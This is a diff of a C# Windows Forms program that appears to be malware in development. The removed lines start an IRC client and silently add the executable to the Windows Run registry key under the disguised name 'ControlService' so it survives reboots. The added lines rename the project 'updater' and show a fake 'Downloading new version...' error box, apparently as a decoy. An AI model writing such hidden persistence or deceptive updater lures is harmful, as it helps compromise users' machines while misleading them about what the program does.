@@ -7,28 +7,24 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using ChatSharp;
-using Microsoft.Win32;
 
-namespace tom
+namespace updater
 {
     public partial class Form1 : Form
     {
-        
-
         public Form1()
         {
             InitializeComponent();
-            IRC irc = new IRC();            
 
-            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-            rk.SetValue("ControlService", Application.ExecutablePath.ToString());
-
+            const string caption = "Error";
+            var result = MessageBox.Show("Downloading new version...", caption,
+                                         MessageBoxButtons.OK,
+                                         MessageBoxIcon.Error);
         }
 
         private void Form1_Load(object sender, EventArgs e)
         {
-             
+
         }
     }
 }
